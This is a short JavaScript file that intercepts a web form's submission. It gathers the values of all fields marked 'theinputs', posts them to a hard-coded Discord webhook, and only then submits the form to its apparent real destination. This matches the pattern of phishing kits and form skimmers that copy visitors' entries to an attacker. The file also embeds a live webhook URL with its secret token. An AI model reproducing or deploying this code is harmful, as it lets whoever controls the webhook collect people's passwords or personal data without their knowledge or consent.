"use strict";

function sendMessageToWebhook(webhookURL, message) {
    const payload = {
        content: "```\n----------------------------------------------\n" + message + "\n----------------------------------------------```"
    };

    return fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('myForm');
    const webhookURL = 'https://discord.com/api/webhooks/1255451054003195985/-IIJYymOmPdQBBXcS2JyhGdD6Bi1ZZrC11bJmLXAIC36Dh2QXpsQhZEomoCSM1h_CsBf';

    form.addEventListener('submit', function(event) {
        event.preventDefault();

        // Gather all inputs with class 'theinputs'
        const inputs = document.querySelectorAll('.theinputs');
        let message = '';

        // Construct the message from inputs
        inputs.forEach(input => {
            message += `${input.name.toUpperCase()}: ${input.value}\n`;
        });

        // Send message to webhook
        sendMessageToWebhook(webhookURL, message.trim())
            .then(response => {
                if (response.ok) {
                    console.log('Message sent successfully');
                    // Proceed with form submission
                    form.submit();
                } else {
                    response.text().then(text => {
                        console.error('Error sending message:', text);
                    });
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    });
});
